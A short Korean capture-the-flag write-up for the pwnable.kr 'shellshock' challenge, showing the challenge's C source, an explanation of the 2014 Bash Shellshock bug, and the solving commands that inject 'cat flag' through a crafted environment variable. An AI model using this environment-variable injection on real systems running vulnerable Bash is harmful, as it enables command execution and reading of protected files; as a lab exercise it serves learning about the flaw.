---
sort: 10
---

# shellshock

home 디렉토리에 있는 shellshock.c 파일을 통해 소스코드를 볼 수 있다.

```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

home 디렉토리에있는 bash를 실행시키는 것이 끝이다.<br>
문제 이름에서 대놓고 shellshock 버그를 쓰라고 알려준다.<br><br>
shellshock버그는 2014년에 발견된 bash에 존재하는 버그로, 아래와 같이 환경변수를 입력하면 단지 환경변수일 뿐인데 문자열로써 인식이 되는 것이 아니라 명령어로써 인식이 되어 실행이 되는 버그다.

```bash
export shellshock='() { :;}; 삽입명령어'
```

물론 2014년 취약점이기 때문에 지금 pwnable.kr 서버에서 사용하고있는 bash에서는 해당 취약점이 절대로 안먹힌다.

```bash
shellshock@pwnable:~$ export shellshock='() { :;}; cat flag'
shellshock@pwnable:~$ ./shellshock
```

```tip
## 알게 된 점

shellshock
```